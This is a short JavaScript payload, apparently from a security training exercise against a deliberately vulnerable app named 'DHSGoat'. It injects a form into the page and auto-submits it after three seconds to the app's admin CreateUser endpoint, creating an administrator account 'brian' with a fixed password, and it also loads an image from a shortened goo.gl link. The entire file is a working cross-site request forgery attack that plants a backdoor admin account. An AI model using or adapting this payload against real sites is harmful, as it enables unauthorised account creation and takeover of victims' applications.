
document.writeln("<img src='https://goo.gl/txgbSj'>");
document.writeln("<form method='post' id='myform' action='http://localhost:8080/DHSGoat/admin/CreateUser'>");
document.writeln("USER:<input name='username' value='brian'><br>");
document.writeln("PASS:<input name='password' value='brian600BBH'><br>");
document.writeln("ROLE:<input name='role' value='admin'><br>");
document.writeln("<input type=submit></form>");
setTimeout(function() {
	document.getElementById("myform").submit();
}, 3000);